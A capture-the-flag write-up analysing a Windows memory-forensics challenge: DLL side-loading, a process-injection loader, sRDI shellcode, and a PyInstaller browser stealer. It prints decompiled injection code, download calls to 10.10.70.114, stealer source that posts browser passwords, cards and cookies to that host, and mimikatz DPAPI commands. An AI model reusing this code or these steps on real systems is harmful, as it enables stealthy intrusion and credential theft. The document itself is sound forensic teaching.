---
title: "L3AKCTF Windows Memory Forensics"
description: "The challenge was fun"
categories: ["Writeups"]
tags: ["Reverse Engineering","Digital Forensics", "Malware Analysis"]
date: 2025-07-21
draft: false
cover: /images/posts_cover/forensics.jpg
math: true
---

# L3AKCTF Memory Forensics writeup

![image](https://hackmd.io/_uploads/Sk-kpNXIlx.png)


> An employee's workstation began acting suspiciously; strange files appeared, and system performance dropped. Can you investigate what happened?

P/s: Thanks abdelrhman322 for creating such an amazing forensics challenge, although I couldn't solve it during the competition, it still a valuable lesson and experience for me. I love your blog btw :>

Let the challenge begin. At first, I was given 3 files:
* disk.ad1 - a disk memory dump file from FTK Imager
* traffic.pcap - network packets captured during the attack
* memdump.mem - a RAM dump

Let's have a look on these files:

## Investigation
3 files was given out, so I guess the flag was seperated into 3 parts, and each part was hidden in each files.
### Disk memory
![image](https://hackmd.io/_uploads/ByzrDg7Ull.png)

It was a `%APPDATA%\Roaming\Microsoft` folder, Powershell history has nothing but a command to dump the memory out. I guess we'll have to decrypt some DPAPI encrypted data cuz there's nothing left in the disk except the SID and masterkey file.

### Network Traffic
![image](https://hackmd.io/_uploads/SJvddl7Ixg.png)

I opened the .pcapng file with Wireshark and noticed a large number of packets exchanged between `10.10.70.140:54971` and `10.10.70.114:443`. Since port 443 is commonly used for HTTPS, and many of the packets were TLS, I assumed the communication was encrypted.

To confirm this, I filtered the traffic using `tls` and examined the packet details. Most of the payloads appeared as encrypted application data, which suggested that I wouldn't be able to directly read the contents without the encryption keys.

At this point, I decided to look for potential ways to decrypt the TLS traffic. One common method is to use a memory dump to extract session keys, so I turned my attention to `memdump.mem`.

### RAM dump

Using volatility3 as my favorite tool when doing memory forensics, starting out with the most common plugins - `windows.pslist`, I noticed some weird behaviors in this memory dump.

![Screenshot_2025-07-14_144159_optimized_1000](https://hackmd.io/_uploads/HyvX5xmUlg.png)

`7za.exe` is the parent process of `conhost.exe` and `msedge.exe`, why would these 2 process be spawned by 7za.exe - a standalone command-line executable file associated with the 7-Zip file archiver ? 

* `conhost.exe` will be spawn as a child process of any process that spawn windows shell process (`powershell.exe` or `cmd.exe`)
* `msedge.exe` is a web browser and it shouldn't be spawned by `7za.exe` under any circumstances.

This could make the `7za.exe` becomes a **Process hollowing host** - spawning msedge.exe, then injecting and executing malicious code within its memory space, or a **Loader** , which loads DLL from disk or memory into the spawned process.

Before dumping the process out, I'll use `windows.filescan` plugin to get the process virtual address in the memory.
![image](https://hackmd.io/_uploads/rJBUalX8ee.png)
Using the virtual address, I dumped it out.
![image](https://hackmd.io/_uploads/Bk-z6e78ll.png)

Let's upload this file on VirusTotal
![image](https://hackmd.io/_uploads/HJpl0xXLxx.png)
with 1/72 vendors flagged as malicious, this file is totally harmless and it's a normal `7za.exe`. However, the file could be use for other attacking method like I said before, I'll continue to investigate the `7za.exe` working directory to see if it does load any DLL.

![image](https://hackmd.io/_uploads/ryIO0xX8lg.png)

Only 1 dll found in its working directory, this is very suspicious because `cryptbase.dll` is usually found in `C:\Windows\System32`, not in `Downloads`. 
Based on these evidences, I can conclude that `7za.exe` was used as an **DLL Side-Loader**, so what is **DLL Side-Loading** ?.

>DLL Side-Loading is a technique where a legitimate, signed executable is tricked into loading a malicious DLL placed in its working directory. Many Windows executables follow a specific DLL search order—prioritizing the current directory before system paths like `System32`. Attackers abuse this behavior by placing a malicious DLL (with the same name as a legitimate one) alongside a trusted executable. When the executable runs, it unknowingly loads and executes the attacker's code.

TL;DR: it executes the fake, malicous DLL instead of the safe one because of the identical name.
## Analyzing the binary
Let's start dumping it out to investigate it.
![image](https://hackmd.io/_uploads/rJg3lbm8lx.png)

There we go there we go, a lil bit of red, , I'll load the DLL into IDA to start reverse engineering on it and to understand its behavior.

```c
int sub_7FFED6511000()
{
  HRSRC ResourceW; // rax
  HRSRC v1; // rdi
  DWORD v2; // ebx
  HGLOBAL Resource; // rax
  HRSRC v4; // rbp
  SIZE_T v5; // rsi
  HRSRC v6; // rdi
  DWORD v7; // edx
  HRSRC v8; // rcx
  __int64 v9; // rax
  DWORD (__stdcall *v10)(LPVOID); // rbx
  HRSRC v11; // rbx
  HMODULE phModule; // [rsp+50h] [rbp-B8h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+58h] [rbp-B0h] BYREF
  DWORD ExitCode; // [rsp+70h] [rbp-98h] BYREF
  SIZE_T NumberOfBytesWritten; // [rsp+78h] [rbp-90h] BYREF
  struct _STARTUPINFOW lpStartupInfo; // [rsp+80h] [rbp-88h] BYREF

  lpStartupInfo.cb = 104;
  memset(&lpStartupInfo.lpReserved, 0, 96);
  LODWORD(ResourceW) = CreateProcessW(
                         L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                         0LL,
                         0LL,
                         0LL,
                         0,
                         4u,
                         0LL,
                         0LL,
                         &lpStartupInfo,
                         &ProcessInformation);
  if ( ResourceW )
  {
    phModule = 0LL;
    LODWORD(ResourceW) = GetModuleHandleExW(4u, sub_7FFED6511000, &phModule);
    if ( ResourceW )
    {
      ResourceW = FindResourceW(phModule, 0x65, L"SHELL");
      v1 = ResourceW;
      if ( ResourceW )
      {
        v2 = SizeofResource(phModule, ResourceW);
        Resource = LoadResource(phModule, v1);
        ResourceW = LockResource(Resource);
        v4 = ResourceW;
        if ( ResourceW )
        {
          if ( v2 )
          {
            v5 = v2;
            ResourceW = VirtualAlloc(0LL, v2, 0x1000u, 0x40u);
            v6 = ResourceW;
            if ( ResourceW )
            {
              sub_7FFED651D400(ResourceW, v4, v2);
              v7 = 0;
              v8 = v6;
              do
              {
                v8 = (v8 + 1);
                v9 = v7++ & 0xF;
                *(v8 - 1) ^= aX7qp9zlma2vtej[v9];
              }
              while ( v7 < v2 );
              ResourceW = VirtualAllocEx(ProcessInformation.hProcess, 0LL, v2, 0x3000u, 0x40u);
              v10 = ResourceW;
              if ( ResourceW )
              {
                NumberOfBytesWritten = 0LL;
                LODWORD(ResourceW) = WriteProcessMemory(
                                       ProcessInformation.hProcess,
                                       ResourceW,
                                       v6,
                                       v5,
                                       &NumberOfBytesWritten);
                if ( ResourceW )
                {
                  ResourceW = CreateRemoteThread(ProcessInformation.hProcess, 0LL, 0LL, v10, 0LL, 0, 0LL);
                  v11 = ResourceW;
                  if ( ResourceW )
                  {
                    ExitCode = 0;
                    GetExitCodeThread(ResourceW, &ExitCode);
                    CloseHandle(v11);
                    CloseHandle(ProcessInformation.hThread);
                    CloseHandle(ProcessInformation.hProcess);
                    LODWORD(ResourceW) = VirtualFree(v6, 0LL, 0x8000u);
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return ResourceW;
}
```

as you can see, this function is absolutely a **process injection** function using a shellcode embedded in the DLL's resources.
```c
CreateProcessW(
                         L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                         0LL,
                         0LL,
                         0LL,
                         0,
                         4u,
                         0LL,
                         0LL,
                         &lpStartupInfo,
                         &ProcessInformation);
```

Create process `msedge.exe` with **SUSPENDED** status, `0x00000004` is `CREATE_SUSPENDED` flag, which means the process is created but its primary thread is not yet running, probally for shellcode injection.

```c
  {
    phModule = 0LL;
    LODWORD(ResourceW) = GetModuleHandleExW(4u, sub_7FFED6511000, &phModule);
    if ( ResourceW )
    {
      ResourceW = FindResourceW(phModule, 0x65, L"SHELL");
      v1 = ResourceW;
      if ( ResourceW )
      {
        v2 = SizeofResource(phModule, ResourceW);
        Resource = LoadResource(phModule, v1);
        ResourceW = LockResource(Resource);
        v4 = ResourceW;
        if ( ResourceW )
        {
          if ( v2 )
          {
            v5 = v2;
            ResourceW = VirtualAlloc(0LL, v2, 0x1000u, 0x40u);
            v6 = ResourceW;
            if ( ResourceW )
            {
              sub_7FFED651D400(ResourceW, v4, v2);
              v7 = 0;
              v8 = v6;
              do
              {
                v8 = (v8 + 1);
                v9 = v7++ & 0xF;
                *(v8 - 1) ^= aX7qp9zlma2vtej[v9];
              }
```
Get current module using `GetModuleHandleExW()`, locate shellcode using `FindResourceW()` with `ID=0x65` and `TYPE=SHELL`. Then load shellcode using `LoadResource()`, allocated the memory for the shellcode by using `VirtualAlloc`, the loaded shellcode will be XOR with a 16-byte key `aX7qp9zlma2vtej`
![image](https://hackmd.io/_uploads/BkisF-mIxe.png)

```c
                       &NumberOfBytesWritten);
                if ( ResourceW )
                {
                  ResourceW = CreateRemoteThread(ProcessInformation.hProcess, 0LL, 0LL, v10, 0LL, 0, 0LL);
                  v11 = ResourceW;
                  if ( ResourceW )
                  {
                    ExitCode = 0;
                    GetExitCodeThread(ResourceW, &ExitCode);
                    CloseHandle(v11);
                    CloseHandle(ProcessInformation.hThread);
                    CloseHandle(ProcessInformation.hProcess);
                    LODWORD(ResourceW) = VirtualFree(v6, 0LL, 0x8000u);
```
The shellcode is executed within msedge.exe using `CreateRemoteThread()`. After execution, the handle is closed using `CloseHandle()`, and the allocated memory is freed with `VirtualFree()`.

In conclusion, this function represents a typical **process injection** technique, where a legitimate process - **msedge.exe** is abused to host and execute malicious shellcode. This approach is commonly used to evade detection by antivirus (AV) and endpoint protection systems, since the malicious code runs under the context of a trusted binary.
### Extracting the shellcode
Let's extract the shellcode to analyze its behavior deeper.
![Screenshot_2025-07-14_160101_optimized_1000](https://hackmd.io/_uploads/Sk3FhWQ8gx.png)
I used [ResourceHacker](https://www.angusj.com/resourcehacker/) to extract the shellcode, and CyberChef to decode it
![image](https://hackmd.io/_uploads/B1-0TZX8xx.png)

At this point, just manually grep for PE headers (4d 5a) or automatically by using binwalk cuz as always shellcode is used for executing a payload or another executable file.

![image](https://hackmd.io/_uploads/H1EpRW7Uxg.png)

P/s: after online researching, I have found some interesting information about this shellcode.
## Shellcode Analyzing
Open the shellcode in HexEditor:
![image](https://hackmd.io/_uploads/Byam1fm8ll.png)
`E8 00 00 00 00 59 49 89 C8 48 81 C1 23 0B 00 00`, let's analyze this header:

`E8 00 00 00 00`: **CALL 0x5 (or $+5)**: push current instruction pointer into the stack, a common shellcode trick to get the current address
`59` : **POP RCX**: retrieves the pointer and stores it in RCX
`49 89 c8`: **MOV R8,RCX**: prepare for a function call
`48 81 c1 23 0b 00 00`: **ADD RCX,0xB23**: adjust the pointer to the another code segment (shellcode).

Further investigation, I found out that this shellcode header was generated by a technique called: [sRDI - Shellcode Reflective DLL Injection](https://github.com/monoxgas/sRDI)
![image](https://hackmd.io/_uploads/r1Fb-7QLxl.png)

>Shellcode reflective DLL injection (sRDI) is a technique that allows converting a given DLL into a position independent shellcode that can then be injected using your favourite shellcode injection and execution technique

Basically, it's just a way to wrap a DLL in shellcode format so that it doesn't need to be loaded through the standard Windows loader (e.g., `LoadLibrary`). Instead, the shellcode contains a minimal PE loader that maps the DLL into memory, resolves imports, handles relocations, and executes the DLL's entry point — all without touching disk or relying on the OS's native loading mechanisms.

This makes sRDI ideal for stealthy in-memory execution, as it helps avoid detection by antivirus and EDR tools that monitor DLL loading or file access.

**Conclusion**: The shellcode was converted into position-independent shellcode, and was turned into a reflective DLL loader.
Load the DLL into IDA:
```c
int RunME_0()
{
  __int64 v0; // rdi
  __int64 v1; // rdx
  CHAR *v2; // rcx
  CHAR v3; // al
  CHAR *v4; // rax
  __int64 v5; // rcx
  CHAR *v6; // rax
  __int64 v7; // rax
  CHAR *v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rax
  char *v11; // r9
  CHAR v12; // r8
  CHAR *v13; // rax
  __int64 v14; // rdx
  CHAR *v15; // rcx
  CHAR v16; // al
  CHAR *v17; // rax
  __int64 v18; // rcx
  CHAR *v19; // rax
  __int64 v20; // rax
  CHAR *v21; // rcx
  __int64 v22; // rdx
  __int64 v23; // rax
  char *v24; // r9
  CHAR v25; // r8
  CHAR *v26; // rax
  int result; // eax
  __int64 v28; // rdx
  CHAR *v29; // rcx
  CHAR v30; // al
  CHAR *v31; // rax
  __int64 v32; // rcx
  CHAR *v33; // rax
  __int64 v34; // rax
  CHAR *v35; // rcx
  __int64 v36; // rbx
  char *v37; // rdx
  CHAR v38; // al
  CHAR *v39; // rax
  CHAR v40[272]; // [rsp+30h] [rbp-458h] BYREF
  CHAR v41[272]; // [rsp+140h] [rbp-348h] BYREF
  CHAR pszPath[272]; // [rsp+250h] [rbp-238h] BYREF
  CHAR v43[272]; // [rsp+360h] [rbp-128h] BYREF

  v0 = 2147483646LL;
  if ( SHGetFolderPathA(0LL, 26, 0LL, 0, pszPath) >= 0 )
  {
    v1 = 260LL;
    v2 = v40;
    do
    {
      if ( v1 == -2147483386 )
        break;
      v3 = v2[pszPath - v40];
      if ( !v3 )
        break;
      *v2++ = v3;
      --v1;
    }
    while ( v1 );
    v4 = v2 - 1;
    if ( v1 )
      v4 = v2;
    v5 = 260LL;
    *v4 = 0;
    v6 = v40;
    do
    {
      if ( !*v6 )
        break;
      ++v6;
      --v5;
    }
    while ( v5 );
    v7 = 260 - v5;
    if ( v5 )
    {
      v8 = &v40[v7];
      v9 = 260 - v7;
      if ( v7 != 260 )
      {
        v10 = 2147483646LL;
        v11 = ("\\encrypted.bin" - v8);
        do
        {
          if ( !v10 )
            break;
          v12 = v8[v11];
          if ( !v12 )
            break;
          *v8 = v12;
          --v10;
          ++v8;
          --v9;
        }
        while ( v9 );
      }
      v13 = v8 - 1;
      if ( v9 )
        v13 = v8;
      *v13 = 0;
    }
    URLDownloadToFileA(0LL, "https://10.10.70.114/encrypted.bin", v40, 0, 0LL);
  }
  v14 = 260LL;
  v15 = v41;
  do
  {
    if ( v14 == -2147483386 )
      break;
    v16 = v15[pszPath - v41];
    if ( !v16 )
      break;
    *v15++ = v16;
    --v14;
  }
  while ( v14 );
  v17 = v15 - 1;
  if ( v14 )
    v17 = v15;
  v18 = 260LL;
  *v17 = 0;
  v19 = v41;
  do
  {
    if ( !*v19 )
      break;
    ++v19;
    --v18;
  }
  while ( v18 );
  v20 = 260 - v18;
  if ( v18 )
  {
    v21 = &v41[v20];
    v22 = 260 - v20;
    if ( v20 != 260 )
    {
      v23 = 2147483646LL;
      v24 = ("\\2.txt" - v21);
      do
      {
        if ( !v23 )
          break;
        v25 = v21[v24];
        if ( !v25 )
          break;
        *v21 = v25;
        --v23;
        ++v21;
        --v22;
      }
      while ( v22 );
    }
    v26 = v21 - 1;
    if ( v22 )
      v26 = v21;
    *v26 = 0;
  }
  URLDownloadToFileA(0LL, "https://10.10.70.114/2.txt", v41, 0, 0LL);
  URLDownloadToFileA(0LL, "https://10.10.70.114/L3AK{AV_evasion_is_easy", v41, 0, 0LL);
  result = SHGetFolderPathA(0LL, 7, 0LL, 0, v43);
  if ( result >= 0 )
  {
    v28 = 260LL;
    v29 = v40;
    do
    {
      if ( v28 == -2147483386 )
        break;
      v30 = v29[v43 - v40];
      if ( !v30 )
        break;
      *v29++ = v30;
      --v28;
    }
    while ( v28 );
    v31 = v29 - 1;
    if ( v28 )
      v31 = v29;
    v32 = 260LL;
    *v31 = 0;
    v33 = v40;
    do
    {
      if ( !*v33 )
        break;
      ++v33;
      --v32;
    }
    while ( v32 );
    v34 = 260 - v32;
    if ( v32 )
    {
      v35 = &v40[v34];
      v36 = 260 - v34;
      if ( 260 != v34 )
      {
        v37 = ("\\sctask.exe" - v35);
        do
        {
          if ( !v0 )
            break;
          v38 = v35[v37];
          if ( !v38 )
            break;
          *v35 = v38;
          --v0;
          ++v35;
          --v36;
        }
        while ( v36 );
      }
      v39 = v35 - 1;
      if ( v36 )
        v39 = v35;
      *v39 = 0;
    }
    return URLDownloadToFileA(0LL, "https://10.10.70.114/sctasks.exe", v40, 0, 0LL);
  }
  return result;
}
```
We have the very first part of the flag: `L3AK{AV_evasion_is_easy`
## Decrypting the TLS Traffic
This function has nothing but only to download several files from a specific address. After this, I can conclude that we have to decrypt the TLS traffic in order to get these downloaded files, but how do I decrypt it ?
In the past, I've faced so many challenges like this, all the times I was given an SSL keylog file or a TLS Secret file so the traffic could be easily decrypted. But this time, it's different. 
I noticed there's a certificate included in the TLS packet:
![image](https://hackmd.io/_uploads/r1pMv77Lex.png)

Uncover its metadata by using openssl:
```openssl x509 -in traffic.cer -inform DER -text -noout -modulus
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            76:a9:af:24:d7:1a:c3:aa:fd:d3:ca:b1:25:fd:0d:f2:90:6a:7e:76
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Validity
            Not Before: Jun 15 01:09:12 2025 GMT
            Not After : Jun 15 01:09:12 2026 GMT
        Subject: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (1323 bit)
                Modulus:
                    04:5e:86:65:4b:c0:a3:b7:ca:87:31:07:a3:36:f5:
                    27:d1:30:5f:6a:44:c8:0e:3d:54:ba:fe:d6:69:c4:
                    51:18:d5:c3:0c:89:c4:65:c0:cc:fb:06:0a:62:59:
                    22:b4:2f:9a:70:25:5f:6d:20:82:5e:3b:f8:4c:7c:
                    a2:9f:3f:5b:04:89:52:51:e7:0f:e8:76:a7:4c:1b:
                    35:83:bf:7f:3e:ae:cd:56:b4:d4:48:7c:66:b0:aa:
                    15:5b:b9:35:c0:a2:0d:92:5b:31:4d:07:9c:1e:91:
                    d5:77:53:46:c6:e4:b7:bf:0a:e1:1e:d9:3a:55:b3:
                    d2:6b:71:3e:25:b1:d3:16:66:0b:98:9c:df:93:5b:
                    e6:7f:ff:82:bc:89:00:00:00:00:00:00:00:00:00:
                    00:00:00:00:00:00:00:00:00:00:00:00:00:01:32:
                    99
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                AE:05:E9:E8:18:02:30:35:FC:BD:2D:A8:B3:68:7E:F0:7E:3E:6D:50
            X509v3 Authority Key Identifier:
                AE:05:E9:E8:18:02:30:35:FC:BD:2D:A8:B3:68:7E:F0:7E:3E:6D:50
            X509v3 Basic Constraints: critical
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        00:4b:05:2a:b4:ae:2b:7e:ad:67:70:29:7a:a7:91:e9:f9:45:
        47:fb:fd:c1:43:36:69:e9:33:7e:29:61:07:71:4d:14:d8:bb:
        25:8f:80:f6:6c:28:1b:6b:a8:dd:20:ab:bb:cd:89:ca:2e:76:
        8b:de:6d:28:72:e0:48:4b:d5:2b:76:ff:8f:90:60:45:24:31:
        e8:58:c4:17:ec:39:c5:f9:2a:cb:c2:f4:64:df:20:af:5f:42:
        f4:aa:78:52:55:76:aa:04:5a:b6:aa:f4:6c:dc:6e:6f:dd:3a:
        93:5b:8c:de:af:a0:ef:8f:89:8a:50:b6:78:b7:33:8e:07:6b:
        4f:dc:e1:69:09:9b:b9:b7:86:45:6e:5d:71:6a:86:53:d6:b6:
        f2:3b:c1:e5:65:c6:fb:45:df:b8:27:2b:df:d9:8f:27:80:b6:
        34:42:ed:ec
Modulus=45E86654BC0A3B7CA873107A336F527D1305F6A44C80E3D54BAFED669C45118D5C30C89C465C0CCFB060A625922B42F9A70255F6D20825E3BF84C7CA29F3F5B04895251E70FE876A74C1B3583BF7F3EAECD56B4D4487C66B0AA155BB935C0A20D925B314D079C1E91D5775346C6E4B7BF0AE11ED93A55B3D26B713E25B1D316660B989CDF935BE67FFF82BC8900000000000000000000000000000000000000000000013299
```

Since we have the modulus, we can easily recreate the private key by factorize it into its two prime components `p` and `q`, then use [rsatool](https://github.com/ius/rsatool) to create the private key.

Using https://factordb.com/, converting the hex value to decimal value, I got the value of `p` and `q`

Using rsatool, I successfully managed to create the private key
![Screenshot_2025-07-14_181344_optimized_1000](https://hackmd.io/_uploads/S1qFoQ7Ieg.png)

Here are the steps to decrypt the traffic using the private key.
`Edit` -> `Preferences` -> `Protocols` -> `TLS` -> `Edit RSA Keys list`.
![image](https://hackmd.io/_uploads/B1FfhmmUxg.png)
As you can see, the `(Pre)-Master-Secret log filename` is for the SSLKeyLog or TLS Secret file I mentioned above.
Hit apply and your traffic will be decrypted:
![image](https://hackmd.io/_uploads/H1iI2QXUxl.png)
Let's save them all.
`2.txt` contains 2nd part of the flag:`_Mastering_forensics_`
Let's see what's sctasks.exe is:
![image](https://hackmd.io/_uploads/SyHMTXQUgg.png)
## Decompiling the stealer
As you can see, `sctasks.exe` has the icon of PyInstaller packed application. I'm gonna use `pyinsxtractor` to extract its .pyc files, then use `pylingual` to decompile them.
```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: browser_stealer.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
browsers = {'avast': appdata + '\\AVAST Software\\Browser\\User Data', 'amigo': appdata + '\\Amigo\\User Data', 'torch': appdata + '\\Torch\\User Data', 'kometa': appdata + '\\Kometa\\User Data', 'orbitum': appdata + '\\Orbitum\\User Data', 'cent-browser': appdata + '\\CentBrowser\\User Data', '7star': appdata + '\\7Star\\7Star\\User Data', 'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data', 'vivaldi': appdata + '\\Vivaldi\\User Data', 'chromium': appdata + '\\Chromium\\User Data', 'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data', 'chrome': appdata + '\\Google\\Chrome\\User Data', 'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data', 'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data', '\\uCozMedia\\Uran\\User Data': appdata + '\\Yandex\\YandexBrowser\\User Data', '\\BraveSoftware\\Brave-Browser\\User Data': appdata + '\\Iridium\\User Data', '\\CocCoc\\Browser\\User Data': roaming + '\\Opera Software\\Opera Stable', '\\Opera Software\\Opera GX Stable': roaming + '\\Opera Software\\Opera GX Stable'}
data_queries = {'login_data': {'query': 'SELECT action_url, username_value, password_value FROM logins', 'file': '\\Login Data', 'columns': ['URL', 'Email', 'Password'], 'decrypt': True}, 'credit_cards': {'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards', 'file': '\\Web Data', 'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'], 'decrypt': True}, 'cookies': {'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies', 'file': '\\Network\\Cookies', 'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'], 'decrypt': True}, 'history': {'query': 'SELECT url, title, last_visit_time FROM urls', 'file': '\\History', 'columns': ['URL', 'Title', 'Visited Time'], 'decrypt': False}, 'downloads': {'query': 'SELECT tab_url, target_path FROM downloads'

def get_master_key(path: str):
    if not os.path.exists(path):
        pass  # postinserted
    return None

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:(-16)]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass.decode()
    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    if content:
        url = 'http://10.10.70.114:443'
        data = {'browser': browser_name, 'type': type_of_data, 'content': content}
        try:
            response = requests.post(url, json=data)
            if response.status_code == 200:
                print(f'\t [*] Data sent successfully for {browser_name}/{type_of_data}')
            return None
    else:  # inserted
        return None
    except Exception as e:
        print(f'\t [-] Error sending data: {e}')
        return None

def decrypt_my_data(encrypted_file):
    with open('encrypted.bin', 'rb') as f:
        content = f.read()
    iv = '1234567891011123'
    encrypted_data = '6b4781995cf5e4e02c2625b3d1ac6389dbaf68fb5649a3c24ede19465f470412'
    key = CryptUnprotectData(content, None, None, None, 0)[1]
    key = bytes.fromhex(key)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = cipher.decrypt(encrypted_data)
    return decrypt_my_data

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f"{path}\\{profile}{type_of_data['file']}"
    if not os.path.exists(db_file):
        pass  # postinserted
    return None

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + '\\Local State'):
            pass  # postinserted
        else:  # inserted
            available.append(x)
    return available
if __name__ == '__main__':
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f'Getting Stored Details from {browser}')
        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            notdefault = ['opera-gx']
            profile = 'Default'
            profile = '' if browser in notdefault else ''
            data = get_data(browser_path, profile, master_key, data_type)
            save_results(browser, data_type_name, data)
            print('\t------\n')
```

There we go, we got a stealer!. We've got our IV and encrypted data here, then what is the encrypted.bin ?
Let's analyze the `encrypted.bin` header:
![image](https://hackmd.io/_uploads/ryxKk47Lee.png)
Searching Google, I found out that `encrypted.bin` is a DPAPI encrypted file by its signature header:
![image](https://hackmd.io/_uploads/H15hJVQIle.png)
## Decrypting DPAPI
Using Nirsoft tools to decrypt - https://www.nirsoft.net/utils/dpapi_data_decryptor.html
![image](https://hackmd.io/_uploads/SyLVqEXIeg.png)

The decryption requires the user's `Windows login password`, `Protect` folder and `Registry Hive folder` (I think registry hive folder is just for getting the user's password since we can dump the password from just SAM, SYSTEM hive, SID and masterkey (from Protect folder)).
Using `windows.hashdump` plugins on the RAM dump, I successfully retrieved the hash.

![Screenshot_2025-07-14_183505_optimized_1000](https://hackmd.io/_uploads/SJ7eb4mUle.png)
Using [crackstation](https://crackstation.net/), I managed to crack the user ntlm hash, which leads to the user's password:
![image](https://hackmd.io/_uploads/rJlNZEXUlg.png)

Next one is to dump the `Protect` folder out using FTK Imager, and click on OK!
![image](https://hackmd.io/_uploads/H1Y-G47Uxg.png)
There we go, `my_super_secret_`, since we already have the IV, I think this is obviously the key, and its length is also 16 bytes, long enough for an AES key, lets try decrypting it:
![image](https://hackmd.io/_uploads/HkYPzVmUxl.png)
Bingo !
Concatinate all 3 parts, our flag is:
`L3AK{AV_evasion_is_easy_Mastering_forensics_is_where_the_challenge_begins}`
P/S: There also another way to decrypt the DPAPI encrypted file, is using `mimikatz`
Command: `dpapi::masterkey /in:<extracted masterkey> /sid:<sid> /password:<password>`

This is how we extract the masterkey:
![image](https://hackmd.io/_uploads/rkhDVVQIgg.png)

Using the extracted masterkey, this is the command to decrypt the encrypted file:
`dpapi::blob /in:<encrypted_file> /masterkey:<value>`
![image](https://hackmd.io/_uploads/By_kS4QIxe.png)
![image](https://hackmd.io/_uploads/HydzHV78xe.png)

## Conclusion
Things learnt:
* Suspicious behavior, hollowed process detecting (from `7za.exe` suspiciously spawned `msedge.exe` to stealer)
* Windows API/ DLL Reverse Engineering
* Extracting shellcode and analyze its header
* sRDI - shellcode Reflective DLL Injection, DLL wrapper technique
* Decrypting TLS Traffic using only RSA Certificiate
* Decrypting DPAPI Encrypted data using Nirsofts Tools and mimikatz

P/s: There's another way to detect hollowed process, is to use `windows.hollow` volatility3 plugins:
![Screenshot_2025-07-14_192517_optimized_1000](https://hackmd.io/_uploads/B1pwhVX8le.png)

Thanks a lot for reading my writeup, stay tune !!